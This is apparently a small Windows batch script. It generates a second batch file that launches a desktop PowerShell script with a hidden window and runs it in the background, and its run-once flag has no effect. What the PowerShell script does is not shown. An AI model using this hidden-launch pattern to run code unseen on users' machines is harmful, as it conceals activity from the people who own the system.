@echo off
set var1=0

if %var1% == 1 (
    goto exit
) else (
    goto ejecutar
)

:ejecutar
echo powershell -WindowStyle Hidden -File C:\Users\Asus\Desktop\codigo\dlslds.ps1 > ejecuter.bat
start /b ejecuter.bat
set var1=1
goto exit

:exit
exit
